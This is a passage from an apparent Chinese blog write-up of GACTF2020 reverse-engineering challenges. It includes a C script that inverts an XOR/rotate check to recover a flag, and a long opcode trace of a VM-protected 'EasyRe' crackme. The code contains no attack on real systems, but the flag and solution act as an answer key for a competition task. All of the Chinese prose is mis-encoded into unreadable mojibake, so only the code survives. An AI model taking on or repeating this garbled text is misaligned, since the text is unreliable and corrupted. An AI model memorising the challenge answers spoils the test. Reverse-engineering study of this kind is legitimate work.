¹æœ¬å°±æ‰§è¡Œä¸åˆ°ï¼Œç›´æ¥è·³è¿‡ã€‚</p><p>å¯¹inputè¿›è¡Œäº†xorä¸roræ“ä½œã€‚ç›´æ¥é€†å³å¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida_[] =</span><br><span class="line">&#123;</span><br><span class="line">   <span class="number">78</span>, <span class="number">174</span>,  <span class="number">97</span>, <span class="number">186</span>, <span class="number">228</span>,  <span class="number">43</span>,  <span class="number">85</span>, <span class="number">170</span>,  <span class="number">89</span>, <span class="number">252</span>, </span><br><span class="line">   <span class="number">77</span>,   <span class="number">2</span>,  <span class="number">23</span>, <span class="number">107</span>,  <span class="number">19</span>, <span class="number">161</span>,  <span class="number">65</span>, <span class="number">254</span>,  <span class="number">53</span>,  <span class="number">11</span>, </span><br><span class="line">  <span class="number">180</span>,  <span class="number">11</span>,  <span class="number">82</span>,  <span class="number">47</span>,  <span class="number">70</span>, <span class="number">204</span>,  <span class="number">53</span>, <span class="number">130</span>, <span class="number">229</span>, <span class="number">136</span>, </span><br><span class="line">   <span class="number">80</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> v37 = <span class="number">6</span>, v38 = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> i, j, len = <span class="number">31</span>;</span><br><span class="line"><span class="keyword">char</span> s[] = <span class="string">"ANNAWGALFYBKVIAHMXTFCAACLAAAAYK"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">2</span>; i &lt; v37; i++)</span><br><span class="line">v38 *= i;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> temp = i%<span class="number">8</span>;</span><br><span class="line"><span class="keyword">int</span> ans = ((ida_[i] &gt;&gt; temp) | (ida_[i]&amp;((<span class="keyword">int</span>)<span class="built_in">pow</span>(<span class="number">2</span>, temp)<span class="number">-1</span>)) &lt;&lt; <span class="number">8</span>-temp) ^ s[i]; <span class="comment">//rol</span></span><br><span class="line"><span class="built_in">putchar</span>(ans ^ v38);</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//wannaflag_is_just_a_paper_tiger</span></span><br></pre></td></tr></table></figure><p>æœ€åå°†å…¶è¾“å…¥ç¨‹åºçš„è¾“å…¥æ¡†ï¼Œæ‰“å¼€è§£å¯†åçš„flagæ–‡ä»¶å¾—åˆ°flagã€‚<img src="/2020/08/30/GACTF2020/image-20200913174837508.png" alt="image-20200913174837508"></p><h3 id="EasyRe"><a href="#EasyRe" class="headerlink" title="EasyRe"></a>EasyRe</h3><p>idaæ‰“å¼€åï¼Œmainå‡½æ•°sp-analysis failedï¼Œç®€å•ä¿®å¤ä¸€ä¸‹æ ˆæŒ‡é’ˆå°±è¡Œã€‚</p><p><img src="/2020/08/30/GACTF2020/image-20200913182620575.png" alt="image-20200913182620575"></p><p>æ¥åˆ°mainå‡½æ•°ï¼Œé¦–å…ˆæ˜¯è¾“å…¥ä¸€ä¸ªæ•´å‹æ•°æ®ï¼Œä»äº¤å‰å¼•ç”¨å‘ç°å¯¹è¯¥æ•°æ®åé¢å¹¶æ²¡æœ‰ä½¿ç”¨ï¼ŒçŒœæµ‹å¯¹å‡½æ•°ä»£ç æœ‰ä¸€ä¸ªè§£å¯†è¿‡ç¨‹ã€‚å‘ç°åé¢æœ‰ä¸€ä¸ª<strong>mprotect()</strong>å‡½æ•°ä¿®æ”¹æŒ‡å®šå†…å­˜ä¿æŠ¤å±æ€§ï¼Œå³æŠŠè¦è§£å¯†çš„ä»£ç çš„å†…å­˜æ”¹ä¸ºå¯å†™ã€‚æ¥ç€çš„å‡½æ•°å®ç°è§£å¯†ä¸€ä¸ªå‡½æ•°ä»£ç åŠŸèƒ½ã€‚</p><p>åŠ¨è°ƒæ¥åˆ°è§£å¯†çš„å‡½æ•°ï¼ˆè¿™é‡Œæˆ‘ä¹Ÿåå¤ä¿®äº†å‡ æ¬¡ï¼Œæ‰å®Œç¾çš„F5ï¼‰ï¼šä¸€ä¸ªVMä¸”å‰é¢å·²ç»ç”³è¯·äº†å­˜æ”¾æ•°æ®çš„å†…å­˜ç©ºé—´å’Œåˆå§‹åŒ–ã€‚<img src="/2020/08/30/GACTF2020/image-20200913183634163.png" alt="image-20200913225646159"></p><p>å¼€å§‹æ˜¯å•æ­¥è°ƒè¯•ï¼Œç”±äºåˆ†æ”¯æ¯”è¾ƒå¤šï¼Œåé¢å°†æ•´ä¸ªå‡½æ•°ä¸opcodeå¤åˆ¶åˆ°Cè¯­è¨€ç¼–è¯‘å™¨ï¼Œæ‰“å°å‡ºå‡½æ•°æ ¹æ®opcodeçš„æ‰§è¡Œæƒ…å†µï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br></pre></td><td class="code"><pre><span class="line">a1[<span class="number">1</span>] = input</span><br><span class="line">a1[<span class="number">9</span>] = a1[<span class="number">1</span>]</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">13</span></span><br><span class="line">a1[<span class="number">1</span>] &gt;&gt;= a1[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line">a1[<span class="number">9</span>] = a1[<span class="number">1</span>]</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">9</span></span><br><span class="line">a1[<span class="number">1</span>] &lt;&lt;= a1[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">2029229568</span></span><br><span class="line">a1[<span class="number">1</span>] &amp;= a1[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line">a1[<span class="number">9</span>] = a1[<span class="number">1</span>]</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">17</span></span><br><span class="line">a1[<span class="number">1</span>] &lt;&lt;= a1[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">-2049703936</span></span><br><span class="line">a1[<span class="number">1</span>] &amp;= a1[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line">a1[<span class="number">9</span>] = a1[<span class="number">1</span>]</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">19</span></span><br><span class="line">a1[<span class="number">1</span>] &gt;&gt;= a1[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] == <span class="number">653840640</span> ) <span class="built_in">exit</span>(<span class="number">0</span>) <span class="comment">//é¦–å…ˆæ ¹æ®è¾“å…¥çš„æ•´å‹æ•°æ®ç»è¿‡è¿ç®—åä¸æŒ‡å®šå€¼è¿›è¡Œæ¯”è¾ƒï¼Œä¸æ­£ç¡®åˆ™é€€å‡ºã€‚</span></span><br><span class="line">    </span><br><span class="line">a1[<span class="number">1</span>] = input <span class="comment">//ä¸‹é¢ä¾æ¬¡ä½¿ç”¨è¾“å…¥çš„æ•´å‹æ•°æ®ç»è¿‡è¿ç®—åå­˜æ”¾å…¥dword_804B2A0æ•°ç»„ã€‚</span></span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">255</span></span><br><span class="line">a1[<span class="number">1</span>] &amp;= a1[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">3</span>] = <span class="number">2</span></span><br><span class="line">a1[<span class="number">1</span>] *= a1[<span class="number">3</span>]</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">24</span></span><br><span class="line">a1[<span class="number">1</span>] += a1[<span class="number">2</span>]</span><br><span class="line">dword_804B2A0[<span class="number">0</span>] = a1[<span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line">a1[<span class="number">1</span>] = input</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">8</span></span><br><span class="line">a1[<span class="number">1</span>] &gt;&gt;= a1[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">255</span></span><br><span class="line">a1[<span class="number">1</span>] &amp;= a1[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">5</span>] = <span class="number">7</span></span><br><span class="line">a1[<span class="number">1</span>] /= a1[<span class="number">5</span>]</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">33</span></span><br><span class="line">a1[<span class="number">1</span>] += a1[<span class="number">2</span>]</span><br><span class="line">dword_804B2A0[<span class="number">1</span>] = a1[<span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line">a1[<span class="number">1</span>] = input</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">16</span></span><br><span class="line">a1[<span class="number">1</span>] &gt;&gt;= a1[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">255</span></span><br><span class="line">a1[<span class="number">1</span>] &amp;= a1[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">9</span>] = <span class="number">187</span></span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">255</span></span><br><span class="line">a1[<span class="number">1</span>] += a1[<span class="number">2</span>]</span><br><span class="line">dword_804B2A0[<span class="number">2</span>] = a1[<span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line">a1[<span class="number">1</span>] = <span class="number">10000</span></span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">24</span></span><br><span class="line">a1[<span class="number">1</span>] &gt;&gt;= a1[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">255</span></span><br><span class="line">a1[<span class="number">1</span>] &amp;= a1[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">4</span>] = <span class="number">160</span></span><br><span class="line">a1[<span class="number">1</span>] -= a1[<span class="number">4</span>]</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">119</span></span><br><span class="line">a1[<span class="number">1</span>] += a1[<span class="number">2</span>]</span><br><span class="line">dword_804B2A0[<span class="number">3</span>] = a1[<span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"flag:"</span>) <span class="comment">//è¾“å…¥flag</span></span><br><span class="line">    </span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">0</span>] <span class="comment">//ä¸‹é¢ä¾æ¬¡å¯¹è¾“å…¥çš„flagçš„æ¯ä¸€ä½ä¸dword_804B2A0ä¸­çš„æ•°æ®å¼‚æˆ–ï¼Œ</span></span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A0[<span class="number">0</span>] </span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">267</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)  <span class="comment">//å¹¶ä¸æŒ‡å®šæ•°æ®æ¯”è¾ƒï¼Œä¸ç›¸ç­‰åˆ™é€€å‡ºã€‚</span></span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">1</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A4</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">122</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2AC</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">149</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">3</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A8</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">262</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">4</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A4</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">125</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">5</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2AC</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">173</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">6</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A0[<span class="number">0</span>]</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">303</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">7</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A8</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">357</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">8</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A0[<span class="number">0</span>]</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">301</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">9</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A0[<span class="number">0</span>]</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">303</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">10</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A8</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">313</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">11</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A8</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">269</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">12</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2AC</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">187</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">13</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A4</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">8</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">14</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A8</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">269</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">15</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A0[<span class="number">0</span>]</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">319</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">16</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A8</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">314</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">17</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A8</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">353</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">18</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A4</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">87</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">19</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A0[<span class="number">0</span>]</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">288</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">20</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A8</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">269</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">21</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A0[<span class="number">0</span>]</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">319</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">22</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A8</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">319</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">23</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2AC</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">181</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">24</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A0[<span class="number">0</span>]</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">275</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">25</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2AC</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">160</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">26</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A0[<span class="number">0</span>]</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">289</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">27</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A8</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">269</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">28</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A4</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">11</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span 